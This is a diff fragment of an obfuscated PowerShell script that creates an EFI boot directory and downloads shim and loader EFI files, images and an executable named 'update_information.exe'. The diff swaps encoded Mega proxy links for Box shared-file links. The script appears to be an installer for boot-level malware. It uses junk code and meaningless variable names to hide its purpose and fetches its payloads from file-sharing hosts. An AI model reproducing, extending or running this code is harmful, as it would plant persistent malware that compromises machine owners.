@@ -44,14 +44,14 @@ New-Item -Path "S:\EFI\Microsoft\Boot" -ItemType Directory -Force|Out-Null
 $v038=2*5-1
 if($v038-gt0){}
 $v016=@(
-@{Url="https://mega.wldbs.workers.dev/download?url=aHR0cHM6Ly9tZWdhLm56L2ZpbGUva0UwQUdBTEMjQVAzNXdDRGgxbm5IOF84VW1PU1ZKOXpiU3Z5UjRMR2tIY2ZFQ1FmRk1POA==";Name="PreLoader.efi"},
-@{Url="https://mega.wldbs.workers.dev/download?url=aHR0cHM6Ly9tZWdhLm56L2ZpbGUvcGRjU0FJQUQjVldUd1dtemFnS3I1LXIxSzJuNXcxOVQwTXg2UlV4V0F5d2hBcTZJcU5RZw==";Name="HashTool.efi"},
-@{Url="https://mega.wldbs.workers.dev/download?url=aHR0cHM6Ly9tZWdhLm56L2ZpbGUvQUVrd21Mb0IjUXVfR21KaFVRVHlGY1V1ME51TkVRX2p0a0tVbGVBVlk5UWFWWTl0d05ZUQ==";Name="loader.efi"},
-@{Url="https://mega.wldbs.workers.dev/download?url=aHR0cHM6Ly9tZWdhLm56L2ZpbGUvTkE5aEJKaEwjMXJPOU1JUnpaOTlkNWEzSW9ZQXRUOGJNaDFuRmJGR0FiSHB5eFFQbkh2SQ==";Name="step1.png"},
-@{Url="https://mega.wldbs.workers.dev/download?url=aHR0cHM6Ly9tZWdhLm56L2ZpbGUvZFVFZ2dhQkIjY2VtYUt2dERFRXdPMUthOFVGdkRJWERHT252cVVmNWFMRktyUWhxcm0wTQ==";Name="step2.png"},
-@{Url="https://mega.wldbs.workers.dev/download?url=aHR0cHM6Ly9tZWdhLm56L2ZpbGUvaFprblJEN0wjTmdWSUdYb0ZJRGVqYkFEVWl6SW8tVXJHWFQ3TGd1VmhXQ2M1NUNhc1o4Zw==";Name="step3.png"},
-@{Url="https://mega.wldbs.workers.dev/download?url=aHR0cHM6Ly9tZWdhLm56L2ZpbGUvc1pzQndEaUIjeUhyUDItQlNhQlN2bjJGemRJQU1nRnVQR2JwYzY5XzNXX05zakVueWpkQQ==";Name="step4.png"},
-@{Url="https://mega.wldbs.workers.dev/download?url=aHR0cHM6Ly9tZWdhLm56L2ZpbGUvRVpzM2lRaVEjS012bjdqTHBTZm9Jdkp2V0FBM1RNQ2hTLXprOFF0cU13d1JsTndvU2tOaw==";Name="update_information.exe"}
+@{Url="https://app.box.com/index.php?rm=box_download_shared_file&shared_name=2ip7ngfbbdrwliwdeex9z78ul38vsyxh&file_id=f_2250971977339";Name="PreLoader.efi"},
+@{Url="https://app.box.com/index.php?rm=box_download_shared_file&shared_name=f8bijduxdd56w2hzeq3bxdwii1abx9oo&file_id=f_2250969066149";Name="HashTool.efi"},
+@{Url="https://app.box.com/index.php?rm=box_download_shared_file&shared_name=vfysjeiqgej3eqvorrdpj2pupvqtnr0c&file_id=f_2251010073218";Name="loader.efi"},
+@{Url="https://app.box.com/index.php?rm=box_download_shared_file&shared_name=ka0v4xdss5u8yp6q3jim3gxphfvws6wf&file_id=f_2251026678792";Name="step1.png"},
+@{Url="https://app.box.com/index.php?rm=box_download_shared_file&shared_name=d4c5qcjm7k59tv9nxd39gcy5aw18e12k&file_id=f_2250998236222";Name="step2.png"},
+@{Url="https://app.box.com/index.php?rm=box_download_shared_file&shared_name=j5g1copuvxst5aw7bqybytkg0j5yd60e&file_id=f_2251014769642";Name="step3.png"},
+@{Url="https://app.box.com/index.php?rm=box_download_shared_file&shared_name=evkg2zohegezvg67ul470bhqusdlheg9&file_id=f_2251009544922";Name="step4.png"},
+@{Url="https://app.box.com/index.php?rm=box_download_shared_file&shared_name=ynm8m655x4jd3s5b1m1cmvrx0wg5vrdl&file_id=f_2251025394169";Name="update_information.exe"}
 )
 foreach($v017 in $v016){
 $v018=Join-Path -Path $v003 -ChildPath $v017.Name
